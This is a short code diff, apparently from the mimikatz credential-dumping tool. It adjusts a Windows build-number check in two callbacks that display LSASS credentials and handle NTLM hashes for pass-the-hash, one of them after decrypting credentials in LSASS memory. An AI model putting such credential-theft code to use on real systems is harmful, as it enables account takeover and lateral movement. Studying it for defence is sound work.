@@ -27,7 +27,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_std(IN PKUHL_M_SEKURLSA_CON
 	DWORD flags = KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIAL;
 	kprintf(L"\n\t [%08x] %Z", AuthenticationPackageId, &pCredentials->Primary);
 	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
-		flags |= (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10b)  ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
+		flags |= (cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)  ? KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY : KUHL_SEKURLSA_CREDS_DISPLAY_PRIMARY_10;
 	else if(RtlEqualString(&pCredentials->Primary, &CREDENTIALKEYS_STRING, FALSE))
 		flags |= KUHL_SEKURLSA_CREDS_DISPLAY_CREDENTIALKEY;
 
@@ -46,7 +46,7 @@ BOOL CALLBACK kuhl_m_sekurlsa_msv_enum_cred_callback_pth(IN PKUHL_M_SEKURLSA_CON
 	if(RtlEqualString(&pCredentials->Primary, &PRIMARY_STRING, FALSE))
 	{
 		(*pthDataCred->pSecData->lsassLocalHelper->pLsaUnprotectMemory)(pCredentials->Credentials.Buffer, pCredentials->Credentials.Length);
-		if(cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10b)
+		if(cLsass->osContext.BuildNumber < KULL_M_WIN_BUILD_10)
 		{
 			if(pthDataCred->pthData->NtlmHash)
 			{
